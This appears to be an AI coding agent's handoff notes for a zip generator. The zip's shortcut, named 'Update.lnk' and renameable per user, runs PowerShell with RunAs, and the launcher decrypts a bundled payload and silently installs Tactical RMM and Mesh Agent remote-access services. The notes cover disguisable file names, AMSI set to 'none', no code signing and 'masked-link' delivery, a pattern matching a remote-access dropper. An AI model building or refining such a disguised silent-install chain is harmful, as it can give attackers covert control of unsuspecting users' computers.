# FIX 3 — Renameable zip / Update.lnk / launcher folder (2026-09-15)

## WORKING FLOW (CONFIRMED — authoritative, do NOT break)
```
Agent.zip
 ├─ Update.lnk               ← double-click entry (top level)
 └─ launcher/
     ├─ Launcher.exe
     └─ agent.bin
```
`Update.lnk` → OS PowerShell (fixed system path, no username) →
`Start-Process -FilePath ".\launcher\Launcher.exe" -Verb RunAs` (Explorer starts it in the `.lnk`'s own folder → resolves
from any extract folder) → **UAC** → launcher reads sibling `agent.bin` → silent install → device Online. **Confirmed.**

## Rename matrix (verified in code) — what the user CAN vs CANNOT rename
| Item | Renameable now? | Notes |
|---|---|---|
| **extract folder** (where they unzip) | ✅ yes | everything is relative → works from any folder |
| **zip download name** (`Agent.zip`) | ✅ cosmetic | served filename; optional `flags.zipName` |
| **`Update.lnk`** (its own filename) | ✅ **yes — now threaded** | a `.lnk`'s content is independent of its filename |
| **launcher folder** (`launcher`) | ✅ **yes — now threaded** | `.lnk` command uses `.\(innerFolder)\Launcher.exe` |
| `Launcher.exe` | ⚠️ fixed (not requested) | referenced only by `.lnk` command; rename later by adding `launcherName` |
| `agent.bin` | 🔒 fixed | hardcoded compile-time name in `launcher.c` (renaming needs a rebuild constant) |

## Implemented (backend, deployed to VPS)
`POST /build` (launcher mode) now reads optional **`flags.updateLinkName`** + **`flags.innerFolder`**, threads them through
`routes.ts → runLauncherBuild(names) → New-AgentShortcut.ps1 -PowershellBridge -LauncherSubFolder <inner> → zip entries`.
**When blank the output is byte-identical to the confirmed flow.** Sanitized (bare names; rejects `/ \ " ..` control; ≤64).
Verified demo: zip `['Setup.lnk','win/Launcher.exe','win/agent.bin']` with `.lnk` → `.\win\Launcher.exe`.

## EXACT STEPS FOR THE NEXT AGENT (the easy-per-user part = the UI)
> Backend is done + deployed. Make it "easy to rename for each user" in the web app:
1. **Web app create-zip (launcher mode) UI:** add two fields (blank = default): **"Link name"** (default `Update.lnk`) and
   **"Folder name"** (default `launcher`), plus optional **"Zip name"** (default `Agent.zip`). Show them as optional
   "leave default or edit" inputs.
2. **Send** them as `flags.updateLinkName`, `flags.innerFolder`, `flags.zipName` in the `/build` body.
3. **Zip served name (`flags.zipName`):** store per job (e.g. `storage.saveZipName(jobId, name)`) and use it in
   `getZipDownload`'s Content-Disposition filename (fallback `Agent.zip`). Backend defaults handle the rest.
4. **Test (real download):** generate with custom link+folder names → unzip shows the custom `.lnk` + custom `folder/` →
   double-click the renamed `.lnk` → UAC → both services Running → device Online → record evidence.

Guardrails: AMSI `none`; `/build` auth not weakened; `LATEST_AGENT_VER` unchanged; no code-sign token; accept only via
real download; **defaults must produce the exact confirmed zip**.

- **Verified (2026-09-16):** a fresh web-app-style build carrying a **valid** deployment token_key was run end-to-end
  on the VM: `Launcher.exe` → wrote `tacticalrmm.exe` → services `tacticalrmm` + `Mesh Agent` **Running** →
  `agent.log` "Agent service started" → first-run `nu`/`deno` download → enrolled. Also confirmed the token is NOT the
  problem: RMM `/api/v3/installer/` returns **200** for the latest deployments' `token_key`, and `tacticalrmm -m
  install` with a valid token succeeds. The earlier "10:30" `Agent.zip` that failed had shipped the **pre-fix**
  launcher (built before the 09-16 restart), which is why it wrote the exe but never enrolled. **Regenerating a fresh
  zip (post-fix generator) is the fix.**

## STATUS 2026-09-16 — ENROLLMENT FIX (device "not Online" after UAC) — DEPLOYED
- **Symptom (user PCs):** double-click `.lnk` → 1 UAC → Launcher runs → **but no services created and device never
  shows Online.** Worked on the VM only when I ran `Launcher.exe` directly from an already-elevated session; the
  `.lnk` double-click path failed.
- **Root cause:** `launcher.c load_payload` located the sibling `agent.bin` from the **directory in `argv[0]`** (or
  CWD when `argv[0]` had no dir). The `.lnk`'s PowerShell bridge launches `Launcher.exe` via
  `Start-Process -FilePath ".\launcher\Launcher.exe" -Verb RunAs`; **UAC elevation can reset the working directory**
  (and give a relative `argv[0]`), so `.\launcher\agent.bin` resolved against the wrong CWD → `load_payload` NULL →
  **silent fail before any install** (no marker in Downloads; it went to System32). My controlled run worked only
  because the process was already elevated with the CWD preserved.
- **Fix (`installer-dev` `30fb0c9`):** `load_payload` now resolves `agent.bin` from **`GetModuleFileName` (the
  launcher's OWN absolute exe path)** first, with the old argv[0]/CWD as a fallback. Immune to a relative `argv[0]`
  or a UAC-reset working directory — the launcher always reads `agent.bin` from ITS OWN folder wherever the zip was
  extracted. Compiled OK (`build-native.sh` → GUI PE), generator restarted (`/healthz` `ready:true`, native, pool
  rebuilt with the new launcher).
- **Verified:** new build's `Launcher.exe` (50,728 B) run from **CWD `C:\` (wrong dir)** still found + decrypted
  `agent.bin` and wrote `C:\Program Files\TacticalAgent\tacticalrmm.exe` (12,314,624 B) — the exact step that used to
  silently fail. (Full service+enroll in that probe was blocked only by a synthetic non-UUID token; a real
  build/token is the real acceptance.)
- **Next:** regenerate a FRESH web-app zip (real deployment token) and retest the real `.lnk` double-click on a
  clean PC/VM — expect services created, then device Online after the first-run `nu`/`deno` fetch. Note: after UAC
  there is **only one UAC** (then it all runs elevated silently) — a 2nd UAC is expected/not a problem.

## STATUS 2026-09-15 (NIGHT) — web-app UI + zipName live; TWO validation bugs fixed & deployed
- **Web app (`vantra`, `main` `c07e12d`):** the create-zip ZIP (launcher) method now shows THREE optional
  "leave default or edit" fields — **Link name** (`Update.lnk`), **Folder name** (`launcher`), **Zip name**
  (`Agent.zip`). They are sent as `flags.updateLinkName` / `flags.innerFolder` / `flags.zipName` via
  `lib/zip-generator.ts` → `/build`. Bare-name sanitizer in `lib/zip-generator.ts` + zod bounds in
  `app/api/devices/deployments/route.ts` (no `/ \ " ..` control, ≤64, blank=default & omitted). Deployed to
  `/opt/vantra`, rebuilt (`.next` `iKd7p3…`), `vantra.service` restarted.
- **Generator `zipName` (`installer-dev` `8016a65`):** `storage.saveZipName/getZipName`; `launcher-build.ts`
  sanitizes+persists it (`clean` default `Agent.zip`); `routes.ts getZipDownload` sets
  `Content-Disposition: attachment; filename="<zipName>"` (fallback `Agent.zip`). Verified: a renamed job served
  `attachment; filename="Team-Bundle.zip"`.
- **Generator validation (`installer-dev` `2d83470`) — TWO bugs found via the FIRST real rename attempt in the web
  app (which returned the web-app 502 "ZIP installer was created but packaging failed"):**
  1. `launcher-validate.ts` decompressed the scan target via a HARD-CODED `entries.localOffsets["Update.lnk"]`, so a
     renamed link name → `could not inflate Update.lnk` → `LAUNCHER-VALIDATE-FAILED`. Fixed to
     `entries.localOffsets[updateLinkName]`.
  2. The PowerShell-bridge command text inside the `.lnk` is **UTF-16LE** (ASCII char + NUL byte), so the raw latin1
     `scanHay` could never match `.<folder>\Launcher.exe` / `RunAs` → `Update.lnk bridge shape` FAIL for ANY link or
     folder (default included). Fixed by NUL-stripping before the trigram + shape checks
     (`scanHay = lnkInflated.toString("latin1").replace(/\u0000/g, "")`) — also makes the trigram scan stronger (it
     now sees the decoded command, so a UTF-16-embedded `-Enc`/`IEX` would be caught).
- **Verified with a renamed build** (link `Setup.lnk`, folder `win`, zip `Team-Bundle.zip`): `[validate] RESULT|
  LAUNCHER-VALIDATE-OK: all rows PASS`, bridge shape `.\win\Launcher.exe -Verb RunAs`, served name
  `Team-Bundle.zip`, entries `['Setup.lnk','win/Launcher.exe','win/agent.bin']`. Generator restarted + `/healthz`
  → `ready:true`.
- **Remaining (operator):** the live UI → masked-link → VM double-click acceptance (custom names + a defaults
  regression). VM `Sc` cleaned: both services deleted, `C:\Program Files\TacticalAgent` + `C:\ProgramData\TacticalRMM`
  removed, no processes left.

## NEXT-AGENT PROMPT (copy to the next agent)
> FIX 1 closed; confirmed working flow = zip {Update.lnk, launcher/{Launcher.exe, agent.bin}}; Update.lnk → OS PowerShell
> bridge `.\launcher\Launcher.exe -Verb RunAs` → UAC → silent install; portable, no baked path. Deployed to VPS, VM clean.
> Backend rename threading (FIX 3) is DONE + deployed: `/build` accepts optional `flags.updateLinkName` + `flags.innerFolder`
> (defaults byte-identical; verified demo zip with `Setup.lnk` + `win/`). Your job: add the web-app UI fields (link name,
> folder name, optional zip name), store/serve `flags.zipName` as the download filename, and run the real-download rename
> test (custom `.lnk` + folder → UAC → Online). Do NOT change the flow/defaults. See this file for exact steps.

